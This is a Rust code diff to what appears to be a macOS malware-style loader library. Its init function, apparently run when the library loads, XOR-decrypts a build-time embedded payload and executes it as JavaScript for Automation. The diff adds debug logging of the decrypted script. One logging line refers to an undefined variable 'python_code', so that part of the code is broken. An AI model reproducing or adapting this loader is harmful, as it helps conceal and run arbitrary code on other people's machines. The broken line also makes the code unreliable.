@@ -2,6 +2,7 @@ extern crate libc;
 
 use libc::{c_char, c_void};
 use std::ffi::CString;
+use log::{LevelFilter};
 
 pub static CODE: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/enc_payload"));
 pub static KEY: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/key"));
@@ -23,10 +24,20 @@ extern "C" {
 pub static INITIALIZE: extern "C" fn() = init;
 #[no_mangle]
 pub extern "C" fn init() {
+    if cfg!(debug_assertions) {
+        simple_logging::log_to_file("/private/tmp/jxa_runner.log", LevelFilter::Debug).unwrap();
+    }
     // XOR Decrypt
     let unencrypted_payload = xor_routine(CODE, KEY);
+    if cfg!(debug_assertions) {
+        log::debug!("Decrypted JXA payload with xor routine and key\n");
+        log::debug!("JXA CODE: {:?}\n", python_code);
+    }
     let code_string = std::str::from_utf8(&*unencrypted_payload).unwrap();
     let code_cstring = CString::new(code_string).expect("Couldn't create CString");
+    if cfg!(debug_assertions) {
+        log::debug!("Successfully created CString with JXA code. Executing JXA with runjxa function");
+    }
     // Execute the jxa code
     unsafe {
         runjxa(code_cstring.as_ptr());
